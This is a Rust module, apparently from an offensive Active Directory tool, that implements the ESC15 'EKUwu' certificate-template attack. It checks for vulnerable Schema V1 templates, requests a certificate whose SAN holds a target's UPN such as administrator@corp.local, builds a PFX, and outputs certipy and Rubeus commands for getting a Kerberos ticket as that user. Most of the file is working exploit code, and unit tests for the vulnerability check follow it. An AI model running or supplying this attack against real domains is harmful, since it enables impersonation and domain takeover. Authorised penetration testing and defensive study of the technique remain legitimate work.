//! ESC15 — Schema V1 Template with Enrollee-Supplied Subject (EKUwu)
//!
//! ESC15 targets **Schema Version 1** certificate templates.  Unlike V2+ templates
//! where `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` is explicitly set, V1 templates
//! **always** allow the enrollee to supply the Subject Alternative Name (SAN)
//! because the SAN flag is implicitly enabled by the legacy schema.
//!
//! On **unpatched** Certificate Authorities (pre-KB5014754), the CA does not
//! enforce the `szOID_NTDS_CA_SECURITY_EXT` (1.3.6.1.4.1.311.25.2) extension
//! that embeds the requester's SID.  This means the SAN in the issued cert is
//! trusted at face value during Kerberos PKINIT — allowing impersonation.
//!
//! **Vulnerable configuration:**
//! - Schema Version 1 template (often legacy templates like `User`, `Machine`,
//!   `DomainController`, `WebServer`).
//! - The CA has **not** applied KB5014754 or the enforcement mode is disabled.
//! - Manager approval is **not** required.
//! - The attacker can enroll in the template.
//!
//! **Attack flow:**
//! 1. Enumerate Schema V1 templates that the current user can enroll in.
//! 2. Submit a CSR with a SAN containing the target's UPN
//!    (e.g. `administrator@corp.local`).
//! 3. The CA issues the cert with the attacker-supplied SAN (no security
//!    extension enforcement).
//! 4. Authenticate via PKINIT → TGT for the impersonated principal.
//!
//! Reference: "EKUwu" — Justin Bollinger (@TechBolts), SpecterOps (2024)

use crate::adcs::pfx::create_pfx;
use crate::adcs::web_enrollment::WebEnrollmentClient;
use crate::adcs::{IssuedCertificate, create_client_auth_csr};
use crate::error::{OverthroneError, Result};
use tracing::info;

// ─────────────────────────────────────────────────────────
//  Constants
// ─────────────────────────────────────────────────────────

/// Schema Version 1 flag value (msPKI-Template-Schema-Version)
pub const SCHEMA_VERSION_1: u32 = 1;

/// The security extension OID added by KB5014754 patching
pub const NTDS_CA_SECURITY_EXT_OID: &str = "1.3.6.1.4.1.311.25.2";

// ─────────────────────────────────────────────────────────
//  Types
// ─────────────────────────────────────────────────────────

/// A Schema V1 template vulnerable to ESC15
#[derive(Debug, Clone)]
pub struct Esc15VulnerableTemplate {
    /// Template common name
    pub template_name: String,
    /// Display name
    pub display_name: String,
    /// Schema version (always 1 for ESC15)
    pub schema_version: u32,
    /// Whether the current user can enroll
    pub enrollable: bool,
    /// Whether manager approval is required (should be false for exploitability)
    pub requires_approval: bool,
    /// Extended Key Usages
    pub ekus: Vec<String>,
}

/// Configuration for an ESC15 attack
#[derive(Debug, Clone)]
pub struct Esc15Config {
    /// CA web enrollment URL
    pub ca_server: String,
    /// Template name (Schema V1)
    pub template: String,
    /// Target user to impersonate via SAN
    pub target_user: String,
    /// Domain name (e.g. corp.local)
    pub domain: String,
}

/// Result of a completed ESC15 attack
#[derive(Debug, Clone)]
pub struct Esc15Result {
    /// The issued certificate
    pub certificate: IssuedCertificate,
    /// The UPN placed in the SAN
    pub impersonated_upn: String,
    /// PKINIT command to authenticate as the target
    pub pkinit_command: String,
    /// Human-readable impact summary
    pub impact_description: String,
}

// ─────────────────────────────────────────────────────────
//  Detection helpers
// ─────────────────────────────────────────────────────────

/// Check whether a given template is a Schema V1 template vulnerable to ESC15.
/// Returns `true` when:
/// - `schema_version == 1`
/// - Manager approval is not required
/// - The template supports Client Authentication or Any Purpose EKU
pub fn is_esc15_vulnerable(
    schema_version: u32,
    requires_manager_approval: bool,
    ekus: &[String],
) -> bool {
    if schema_version != SCHEMA_VERSION_1 || requires_manager_approval {
        return false;
    }

    // Schema V1 templates always allow enrollee-supplied SAN, so any
    // template with Client Auth or Any Purpose is exploitable.
    ekus.iter().any(|eku| {
        eku.contains("1.3.6.1.5.5.7.3.2")        // Client Authentication
            || eku.contains("2.5.29.37.0")          // Any Purpose
            || eku.contains("Any Purpose")
            || eku.contains("1.3.6.1.4.1.311.20.2.2") // PKINIT Client Authentication
    })
}

/// Check whether the CA has the security extension enforcement patch applied.
/// This checks the issued certificate for the szOID_NTDS_CA_SECURITY_EXT
/// extension (1.3.6.1.4.1.311.25.2).
pub fn cert_has_security_extension(cert_der: &[u8]) -> bool {
    use x509_parser::parse_x509_certificate;

    match parse_x509_certificate(cert_der) {
        Ok((_, cert)) => cert
            .extensions()
            .iter()
            .any(|ext| ext.oid.to_string() == NTDS_CA_SECURITY_EXT_OID),
        Err(_) => false,
    }
}

// ─────────────────────────────────────────────────────────
//  Exploiter
// ─────────────────────────────────────────────────────────

/// ESC15 exploiter — Schema V1 template SAN abuse
pub struct Esc15Exploiter {
    web_client: WebEnrollmentClient,
}

impl Esc15Exploiter {
    /// Create a new ESC15 exploiter
    pub fn new(ca_server: &str) -> Result<Self> {
        let web_client = WebEnrollmentClient::new(ca_server)?;
        Ok(Self { web_client })
    }

    /// Execute the ESC15 attack — request a cert from a Schema V1 template
    /// with a SAN containing the target's UPN.
    pub async fn exploit(&self, config: &Esc15Config) -> Result<Esc15Result> {
        let target_upn = if config.target_user.contains('@') {
            config.target_user.clone()
        } else {
            format!("{}@{}", config.target_user, config.domain)
        };

        info!(
            "ESC15: Exploiting Schema V1 template '{}' with SAN={}",
            config.template, target_upn
        );

        // Build a CSR with the target UPN in the SAN
        let subject_cn = format!("overthrone-esc15-{}", config.target_user);
        let (csr_der, private_key) =
            create_client_auth_csr(&subject_cn, &config.template, Some(&target_upn))?;

        let response = self
            .web_client
            .submit_request_with_san(&csr_der, &config.template, &target_upn)
            .await?;

        if !response.is_issued() {
            return Err(OverthroneError::EscAttack {
                esc_number: 15,
                reason: format!(
                    "CA rejected ESC15 request (V1 template may be patched): {}",
                    response.message
                ),
            });
        }

        let cert_data = response
            .certificate
            .ok_or_else(|| OverthroneError::Adcs("No certificate in CA response".to_string()))?;

        // Check whether the security extension was added (indicates the CA is patched)
        if cert_has_security_extension(&cert_data) {
            tracing::warn!(
                "ESC15: The issued certificate contains the szOID_NTDS_CA_SECURITY_EXT \
                 extension — the CA appears to be patched (KB5014754). PKINIT impersonation \
                 may fail if the enforcement registry key is active."
            );
        }

        let pfx_data =
            create_pfx(&cert_data, &private_key, None).unwrap_or_else(|_| cert_data.clone());

        let pkinit_command = format!(
            "certipy auth -pfx esc15_{target_user}.pfx -dc-ip <DC_IP> -domain {domain}\n\
             # OR:\n\
             Rubeus.exe asktgt /user:{target_user} /certificate:esc15_{target_user}.pfx \
             /domain:{domain} /nowrap",
            target_user = config.target_user,
            domain = config.domain,
        );

        let impact_description = format!(
            "ESC15: A Schema V1 certificate template ('{}') was used to obtain a certificate \
             with SAN='{}'. Because V1 templates implicitly allow enrollee-supplied subjects \
             and the CA does not enforce the security extension (KB5014754), PKINIT \
             authentication with this certificate yields a TGT as '{}'.",
            config.template, target_upn, target_upn
        );

        Ok(Esc15Result {
            certificate: IssuedCertificate {
                pfx_data,
                thumbprint: Self::compute_thumbprint(&cert_data),
                serial_number: Self::extract_serial(&cert_data).unwrap_or_default(),
                valid_from: "Unknown".to_string(),
                valid_to: "Unknown".to_string(),
                template: config.template.clone(),
                subject: format!("CN={}", subject_cn),
                issuer: self.web_client.base_url(),
                public_key_algorithm: "RSA".to_string(),
                signature_algorithm: "SHA256RSA".to_string(),
                private_key_pem: private_key,
            },
            impersonated_upn: target_upn,
            pkinit_command,
            impact_description,
        })
    }

    fn compute_thumbprint(der: &[u8]) -> String {
        use sha1::{Digest, Sha1};
        let digest = Sha1::digest(der);
        hex::encode(digest)
    }

    fn extract_serial(der: &[u8]) -> Option<String> {
        use x509_parser::parse_x509_certificate;
        parse_x509_certificate(der)
            .ok()
            .map(|(_, c)| c.raw_serial_as_string())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_is_esc15_vulnerable_true() {
        assert!(is_esc15_vulnerable(
            1,
            false,
            &["1.3.6.1.5.5.7.3.2".to_string()],
        ));
    }

    #[test]
    fn test_is_esc15_vulnerable_false_v2() {
        assert!(!is_esc15_vulnerable(
            2,
            false,
            &["1.3.6.1.5.5.7.3.2".to_string()],
        ));
    }

    #[test]
    fn test_is_esc15_vulnerable_false_approval() {
        assert!(!is_esc15_vulnerable(
            1,
            true,
            &["1.3.6.1.5.5.7.3.2".to_string()],
        ));
    }

    #[test]
    fn test_is_esc15_vulnerable_any_purpose() {
        assert!(is_esc15_vulnerable(1, false, &["2.5.29.37.0".to_string()],));
    }

    #[test]
    fn test_security_extension_oid() {
        assert_eq!(NTDS_CA_SECURITY_EXT_OID, "1.3.6.1.4.1.311.25.2");
    }
}
